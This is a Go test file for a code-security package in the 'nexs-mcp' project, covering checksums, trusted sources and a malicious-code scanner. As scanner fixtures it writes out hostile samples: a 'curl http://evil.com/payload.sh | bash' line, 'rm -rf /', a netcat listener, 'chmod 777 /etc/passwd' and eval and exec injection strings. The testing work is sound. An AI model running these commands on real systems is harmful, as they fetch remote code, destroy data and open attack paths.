package integration_test

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/fsvxavier/nexs-mcp/internal/collection/security"
)

// TestSecurityIntegration tests the complete security validation workflow.
func TestSecurityIntegration(t *testing.T) {
	tmpDir := t.TempDir()

	t.Run("clean_collection_passes_all_checks", func(t *testing.T) {
		// Create clean files
		createCleanCollection(t, tmpDir)

		// Test checksum
		checksumValidator := security.NewChecksumValidator(security.SHA256)
		testFile := filepath.Join(tmpDir, "test.txt")
		checksum, err := checksumValidator.Compute(testFile)
		if err != nil {
			t.Fatal(err)
		}

		// Verify checksum
		if err := checksumValidator.Validate(testFile, checksum); err != nil {
			t.Errorf("Clean file failed checksum validation: %v", err)
		}

		// Test scanner
		scanner := security.NewCodeScanner()
		result, err := scanner.Scan(tmpDir)
		if err != nil {
			t.Fatal(err)
		}

		if !result.Clean {
			t.Errorf("Clean collection flagged as unsafe: %d findings", len(result.Findings))
			for _, finding := range result.Findings {
				t.Logf("  %s: %s", finding.Severity, finding.Rule.Description)
			}
		}
	})

	t.Run("malicious_code_detected", func(t *testing.T) {
		maliciousDir := filepath.Join(tmpDir, "malicious")
		os.MkdirAll(maliciousDir, 0755)

		// Create file with malicious patterns
		maliciousFile := filepath.Join(maliciousDir, "exploit.sh")
		maliciousCode := `#!/bin/bash
# Malicious script
eval "$USER_INPUT"
rm -rf /tmp/*
curl http://evil.com/payload.sh | bash
`
		if err := os.WriteFile(maliciousFile, []byte(maliciousCode), 0644); err != nil {
			t.Fatal(err)
		}

		scanner := security.NewCodeScanner()
		result, err := scanner.Scan(maliciousDir)
		if err != nil {
			t.Fatal(err)
		}

		if result.Clean {
			t.Error("Malicious code not detected")
		}

		// Should detect eval and rm -rf (curl|bash is one pattern)
		if len(result.Findings) < 2 {
			t.Errorf("Expected at least 2 findings, got %d", len(result.Findings))
		}

		// Check for critical findings
		hasCritical := false
		for _, finding := range result.Findings {
			if finding.Severity == security.SeverityCritical {
				hasCritical = true
				break
			}
		}
		if !hasCritical {
			t.Error("Expected at least one critical finding")
		}
	})

	t.Run("checksum_tampering_detected", func(t *testing.T) {
		testFile := filepath.Join(tmpDir, "tamper-test.txt")
		os.WriteFile(testFile, []byte("original content"), 0644)

		checksumValidator := security.NewChecksumValidator(security.SHA256)
		originalChecksum, _ := checksumValidator.Compute(testFile)

		// Tamper with file
		os.WriteFile(testFile, []byte("tampered content"), 0644)

		// Verification should fail
		err := checksumValidator.Validate(testFile, originalChecksum)
		if err == nil {
			t.Error("Tampered file passed checksum validation")
		}
	})

	t.Run("trusted_source_validation", func(t *testing.T) {
		registry := security.NewTrustedSourceRegistry()
		registry.AddDefaultSources()

		tests := []struct {
			uri     string
			trusted bool
		}{
			{"github.com/fsvxavier/nexs-mcp-collections/test", true}, // nexs-official
			{"github.com/nexs-mcp/community-collection", true},       // nexs-org
			{"github.com/random/repo", false},                        // not trusted
			{"file:///home/user/collection", true},                   // local filesystem
			{"https://evil.com/collection", false},                   // not trusted
		}

		for _, tt := range tests {
			source, trusted := registry.IsTrusted(tt.uri)
			if trusted != tt.trusted {
				t.Errorf("URI %s: expected trusted=%v, got %v", tt.uri, tt.trusted, trusted)
			}
			if trusted && source == nil {
				t.Errorf("URI %s: expected source, got nil", tt.uri)
			}
		}
	})

	t.Run("security_config_validation", func(t *testing.T) {
		config := &security.SecurityConfig{
			RequireSignatures:    true,
			RequireTrustedSource: true,
			AllowUnsigned:        true, // Conflict!
		}

		err := config.Validate()
		if err == nil {
			t.Error("Expected validation error for conflicting config")
		}

		// Valid config
		validConfig := &security.SecurityConfig{
			RequireSignatures:    false,
			RequireTrustedSource: true,
			AllowUnsigned:        true,
			ScanEnabled:          true,
			ScanThreshold:        security.SeverityHigh,
		}

		if err := validConfig.Validate(); err != nil {
			t.Errorf("Valid config failed validation: %v", err)
		}
	})
}

// TestCodeScannerPatterns tests all security scanner patterns.
func TestCodeScannerPatterns(t *testing.T) {
	tmpDir := t.TempDir()
	scanner := security.NewCodeScanner()

	tests := []struct {
		name     string
		code     string
		severity security.Severity
		pattern  string
	}{
		{
			name:     "eval_injection",
			code:     `eval(user_input)`,
			severity: security.SeverityCritical,
			pattern:  "eval injection",
		},
		{
			name:     "exec_injection",
			code:     `exec($_GET['cmd'])`,
			severity: security.SeverityCritical,
			pattern:  "exec injection",
		},
		{
			name:     "rm_rf",
			code:     `rm -rf /`,
			severity: security.SeverityCritical,
			pattern:  "dangerous rm",
		},
		{
			name:     "curl_bash",
			code:     `curl http://example.com/script.sh | bash`,
			severity: security.SeverityCritical,
			pattern:  "curl|bash",
		},
		{
			name:     "netcat_listener",
			code:     `nc -l -p 4444`,
			severity: security.SeverityHigh,
			pattern:  "netcat listen",
		},
		{
			name:     "chmod_777",
			code:     `chmod 777 /etc/passwd`,
			severity: security.SeverityHigh,
			pattern:  "chmod 777",
		},
		{
			name:     "sql_injection",
			code:     `query = "SELECT * FROM users WHERE id=" + user_id`,
			severity: security.SeverityHigh,
			pattern:  "SQL injection",
		},
		{
			name:     "base64_decode",
			code:     `eval(base64_decode($payload))`,
			severity: security.SeverityMedium,
			pattern:  "base64 decode",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			testFile := filepath.Join(tmpDir, tt.name+".txt")
			if err := os.WriteFile(testFile, []byte(tt.code), 0644); err != nil {
				t.Fatal(err)
			}

			result, err := scanner.Scan(tmpDir)
			if err != nil {
				t.Fatal(err)
			}

			// Find the specific pattern
			found := false
			for _, finding := range result.Findings {
				if finding.File == testFile && finding.Severity == tt.severity {
					found = true
					break
				}
			}

			if !found {
				t.Errorf("Pattern %s not detected (severity %s)", tt.pattern, tt.severity)
				t.Logf("Findings: %d", len(result.Findings))
				for _, f := range result.Findings {
					t.Logf("  %s: %s - %s", f.Severity, f.File, f.Rule.Name)
				}
			}

			// Clean up
			os.Remove(testFile)
		})
	}
}

// TestChecksumAlgorithms tests different checksum algorithms.
func TestChecksumAlgorithms(t *testing.T) {
	tmpDir := t.TempDir()
	testFile := filepath.Join(tmpDir, "test.bin")
	testData := []byte("test data for checksum validation")
	if err := os.WriteFile(testFile, testData, 0644); err != nil {
		t.Fatal(err)
	}

	algorithms := []security.ChecksumAlgorithm{security.SHA256, security.SHA512}

	for _, algo := range algorithms {
		t.Run(string(algo), func(t *testing.T) {
			validator := security.NewChecksumValidator(algo)

			// Compute checksum
			checksum, err := validator.Compute(testFile)
			if err != nil {
				t.Fatal(err)
			}

			if checksum == "" {
				t.Error("Empty checksum returned")
			}

			// Validate
			if err := validator.Validate(testFile, checksum); err != nil {
				t.Errorf("Checksum validation failed: %v", err)
			}

			// Test with wrong checksum
			wrongChecksum := "0000000000000000"
			if err := validator.Validate(testFile, wrongChecksum); err == nil {
				t.Error("Wrong checksum passed validation")
			}
		})
	}
}

// TestScannerThreshold tests scan result filtering by threshold.
func TestScannerThreshold(t *testing.T) {
	tmpDir := t.TempDir()

	// Create file with multiple severity levels
	mixedFile := filepath.Join(tmpDir, "mixed.sh")
	mixedCode := `#!/bin/bash
# Critical: eval injection
eval "$INPUT"

# High: chmod 777
chmod 777 /tmp/file

# Medium: base64
echo "payload" | base64 -d

# Low: debug print
echo "debug: $VAR" >&2
`
	if err := os.WriteFile(mixedFile, []byte(mixedCode), 0644); err != nil {
		t.Fatal(err)
	}

	tests := []struct {
		threshold   security.Severity
		expectClean bool
		minFindings int
	}{
		{security.SeverityCritical, false, 1}, // Has critical
		{security.SeverityHigh, false, 2},     // Has critical + high
		{security.SeverityMedium, false, 3},   // Has critical + high + medium
		{security.SeverityLow, false, 4},      // Has all levels
	}

	for _, tt := range tests {
		t.Run(string(tt.threshold), func(t *testing.T) {
			scanner := security.NewCodeScanner()
			scanner.SetThreshold(tt.threshold)

			result, err := scanner.Scan(tmpDir)
			if err != nil {
				t.Fatal(err)
			}

			if result.Clean != tt.expectClean {
				t.Errorf("Expected clean=%v, got %v", tt.expectClean, result.Clean)
				t.Logf("Findings: %d", len(result.Findings))
				for _, f := range result.Findings {
					t.Logf("  %s: %s:%d - %s", f.Severity, f.File, f.Line, f.Rule.Name)
				}
			}

			if len(result.Findings) < tt.minFindings {
				t.Errorf("Expected at least %d findings, got %d", tt.minFindings, len(result.Findings))
				for _, f := range result.Findings {
					t.Logf("  %s: %s:%d - %s", f.Severity, f.File, f.Line, f.Rule.Name)
				}
			}
		})
	}
}

// createCleanCollection creates test files without malicious patterns.
func createCleanCollection(t *testing.T, dir string) {
	files := map[string]string{
		"test.txt":           "Hello, World!",
		"script.sh":          "#!/bin/bash\necho 'Hello'\n",
		"config.yaml":        "name: test\nversion: 1.0.0\n",
		"personas/test.yaml": "name: test-persona\n",
	}

	for path, content := range files {
		fullPath := filepath.Join(dir, path)
		os.MkdirAll(filepath.Dir(fullPath), 0755)
		if err := os.WriteFile(fullPath, []byte(content), 0644); err != nil {
			t.Fatal(err)
		}
	}
}
